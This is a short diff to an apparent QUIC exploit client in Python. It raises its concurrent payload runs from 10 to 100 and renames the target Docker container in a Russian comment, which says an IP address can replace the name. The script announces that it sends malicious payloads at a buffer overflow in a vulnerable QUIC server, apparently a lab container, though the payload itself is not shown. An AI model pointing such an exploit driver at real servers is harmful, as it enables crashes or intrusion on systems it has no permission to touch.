@@ -66,8 +66,8 @@ class QuicExploitClient:
                 break
         return response
 
-    # здесь вхождение в 10 итераций, но можно и мульт жахнуть
-    async def run_exploit(self, times: int = 10):
+    # здесь вхождение в 100 итераций, но можно и мульт жахнуть
+    async def run_exploit(self, times: int = 100):
         tasks = []
         for i in range(times):
             task = asyncio.create_task(self.send_exploit_payload(i))
@@ -82,6 +82,6 @@ if __name__ == "__main__":
     print("QUIC Exploit Client - Sending malicious payloads")
     print("Target: vulnerable QUIC server with buffer overflow in meta tags")
     
-    # здесь haCker это имя контейнера Docker, но его можно заменить IP адресом
+    # здесь vsQUIC это имя контейнера Docker, но его можно заменить IP адресом
     client = QuicExploitClient("vsQUIC", 4433)
     asyncio.run(client.run_exploit(times=10))
